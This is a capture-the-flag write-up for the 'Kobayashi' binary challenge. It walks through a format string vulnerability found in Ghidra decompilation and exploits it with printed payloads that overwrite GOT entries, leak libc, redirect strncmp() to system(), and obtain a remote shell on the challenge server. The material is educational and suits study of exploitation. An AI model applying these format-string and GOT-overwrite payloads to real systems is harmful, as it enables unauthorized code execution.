# Kobayashi

![challenge description](img/description.png)

> Dave got a VR headset and is unable to take it off. It's like he is trapped in an impossible game. Can you help him win so he can see his son, Davey

## The Binary
```
$ file kobayashi
kobayashi: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=237f88d2fec7497083fdcc6384b9d5695075a1c9, stripped
$ checksec kobayashi
[*] './kobayashi'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We see that this is a 32 bit binary with NX and stack cookies enabled, but other protections are off. Unfortunately, it's also stripped.

Let's see what happens when we run it:
```
Kirk, we have received a distress signal from a nearby ship, the Kobayashi Maru. They have a full crew onboard and their engine has broken down

We have the following options:
[1]: Proceed to the ship with shields down, ready to beam their crew members aboard (quick rescue)
[2]: Proceed to the ship with shields up, prepared for any enemy ships (longer rescue)
[3]: Charge photon lasers and fire on the ship because you think it is an ambush (no trust)
Choice:
```

This is a long menu binary with lots of options, so I popped it open in Ghidra and started taking a look around.

Essentially, if you say `2` for the initial action, you can issue commands to the 4 crew members, `Nyota`, `Scotty`, `Janice`, and `Leonard`. When going through all of the functions to handle the different crew members, I found the vulnerability.

## The Vulnerability
Let's look at the function for handling Leonard as the last crew member:
```c
void get_input(int out_str,int length,FILE *fp)

{
  int iVar1;
  int __fd;
  int in_GS_OFFSET;
  char temp_char;
  int local_18;
  int fd;
  int cookie;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  temp_char = '\0';
  __fd = fileno(fp);
  local_18 = 0;
  while ((local_18 <= length && (read(__fd,&temp_char,1), temp_char != '\n'))) {
    *(char *)(local_18 + out_str) = temp_char;
    local_18 = local_18 + 1;
  }
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    cookie_fail();
  }
  return;
}

void leonard_l4(void)

{
  int in_GS_OFFSET;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  
  local_10 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  printf(
        "Everything is dark. The enemy ship has beamed a boarding crew aboard and there is nothingfor you to do. They have released gas in the ship and you are becoming incoherent."
        );
  puts("Do you have any dying words?");
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  local_14 = 0;
  get_input((int)&local_24,0x13,stdin);
  printf((char *)&local_24);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```
(disassembly from Ghidra)

In `leonard_l4()`, we see that user input (`local_24`) is passed as the first argument to `printf()`, which is a [format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack). We can utilize this vulnerability to achieve arbitrary read and write in order to get the flag.

## The Exploit
There are two main ways to utilize this vulnerability:

1. Return to a libc `one_gadget` that will immediately give us a shell, provided that we can meet the constraints
2. Overwrite a function pointer with `system()` and call `system("/bin/sh")` (or `system("/cat/flag") or somethihng similar)

Let's look at the possible one gadgets for this libc (32-bit libc 2.27):
```
$ one_gadget libc.so.6 
0x3cbea execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x3cbec execve("/bin/sh", esp+0x38, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x38] == NULL

0x3cbf0 execve("/bin/sh", esp+0x3c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x3c] == NULL

0x3cbf7 execve("/bin/sh", esp+0x40, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x40] == NULL

0x6729f execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x672a0 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL

0x13573e execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x13573f execl("/bin/sh", [esp])
constraints:
  ebx is the GOT address of libc
  [esp] == NULL
```

Unfortunately, all of these gadgets require a register to point to the GOT address of libc, and when `leonard_l4()` exits, none of the above registers have that value in it (`edi` does, and mabye I could have spent some time trying to find a way to `mov esi, edi` or something, but I decided to do Option #2).

I thought about a couple different ways to exploit this, but here's how I ended up doing it:

1. Overwrite `exit()` GOT address with `main()` (0x80486b1)
    * This allows us to trigger the format string vulnerability multiple times
2. Get a libc leak
3. Rewrite `exit()` GOT address with `leonard_l4()` (0x804aacd)
4. Use the format string vulnerability twice to overwrite `strncmp()` GOT with `system()`
5. Rewrite `exit()` GOT address back to `main()`
6. Call `strncmp("/bin/sh", ...)` (which will actually do `system("/bin/sh")`)

I am 99% sure that I could have skipped the `exit()`->`main()` at first and just do `exit()`->`leonard_l4()` but I already had the leak working when I started doing this exploit path so I just left it.

### 1. `exit()` -> `main()`

First, we need to overwrite the `exit()` GOT address with the address of `main()`. Because `exit()` hasn't been resolved yet, the current value points to the PLT code used to initially resolve the symbol, so I can do a partial overwrite. I used the following format string payload:

```
\x1c\xf0\x04\x08%34476da%6$hn
```

`\x1c\xf0\x04\x08`: The first 4 bytes are the GOT address for `exit()` (0x804f01c)

`%34476d`: Then we print out the necessary amount of bytes to change the lower 2 bytes to point to `main`, which is at `0x80486b1`. We are printing out 5 bytes already (4 byte and 1 byte padding), so we subtract 5 from `0x86b1` and convert to decimal.

`a`: padding

`%6$hn`: Write 2 bytes to the address in argument 6, which is the GOT address at the beginning of the string.

### 2. libc leak

We can leak libc by using the format string `%5$p`, which will print the 5th argument as a pointer. The 5th argument is a pointer to libc GOT, so we can subtract the offset from the libc GOT to the base address to complete our libc leak.

### 3. `exit()` -> `leonard_l4()`
This is the same process as overwriting `exit()` with `main()`, just a different address:

```
\x1c\xf0\x04\x08%43720da%6$hn
```

### 4. `strncmp()` -> `system()`
Now we need to overwrite `strncmp()`. Why `strncmp()`? Well, it is one of two libc functions being called in this programming where a user-specified string is the first argument (the other is `printf()`), and we are able to control when it gets executed by changing the `exit()` GOT address. By looping `leonard_l4()`, we eliminate any call to `strncmp`, which allows us to utilize the format string vulnerability twice to overwrite the GOT address. Unfortunately, we can't do this in one shot because we can only pass 20 bytes of user input to `printf()` at a time.

The actual process to overwrite this is the same as the previous writes, but we do it twice, writing 2 bytes at a time: First to `system()` GOT address, and then to `system()` GOT address plus 2`

First overwrite:
```
0\xf0\x04\x08%32011da%6$hn
```

Second overwrite:
```
2\xf0\x04\x08%63441da%6$hn
```

### 5. `exit()` -> `main()`
Now that `strncmp()` points to `system()`, we need to cause `main()` to be executed, which will in turn cause `strncmp()` to be triggered when the program asks for the crew member name.

We do this the exact same way as before:
```
\x1c\xf0\x04\x08%34476da%6$hn
```

### 6. `system("/bin/sh")`
Now, we can trigger the vulnerability and get a shell!
```
./exploit.py remote
[+] Opening connection to pwn.ctf.b01lers.com on port 1006: Done
[*] leak: 0xf7ecd000
[*] full system addr: 0xf7d34d10
[*] Switching to interactive mode


$ id
uid=1000(kobayashi) gid=1000(kobayashi) groups=1000(kobayashi)
$  
```
